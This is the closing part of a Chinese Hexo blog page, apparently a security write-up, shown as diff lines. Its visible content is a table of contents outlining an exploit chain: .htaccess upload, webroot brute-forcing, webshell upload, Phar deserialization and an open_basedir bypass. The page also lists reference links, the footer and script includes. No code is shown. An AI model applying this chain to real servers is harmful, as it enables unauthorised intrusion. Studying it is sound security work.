class="nav-text">第一步我们要上传一个.htaccess的文件因为后文要把它解析为php文件。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第二步爆破出webroot，方便后面的文件写入："><span class="nav-number">1.1.2.25.</span> <span class="nav-text">第二步爆破出webroot，方便后面的文件写入：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第三步上传webshell文件，这里主要是为了在反序列化时包含文件名作为webshell。"><span class="nav-number">1.1.2.26.</span> <span class="nav-text">第三步上传webshell文件，这里主要是为了在反序列化时包含文件名作为webshell。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第四步我们Phar协议来反序列化，触发文件名的包含。"><span class="nav-number">1.1.2.27.</span> <span class="nav-text">第四步我们Phar协议来反序列化，触发文件名的包含。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第五步我们上传shell文件："><span class="nav-number">1.1.2.28.</span> <span class="nav-text">第五步我们上传shell文件：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最后绕过open-basedir"><span class="nav-number">1.1.2.29.</span> <span class="nav-text">最后绕过open_basedir:</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考资料"><span class="nav-number">1.1.3.</span> <span class="nav-text">参考资料</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-www-anquanke-com-post-id-193939-h3-7"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">https://www.anquanke.com/post/id/193939#h3-7</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-hexo-imagemlt-xyz-post-php-bypass-open-basedir"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-paper-seebug-org-680"><span class="nav-number">1.1.3.3.</span> <span class="nav-text">https://paper.seebug.org/680/</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">82.2k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
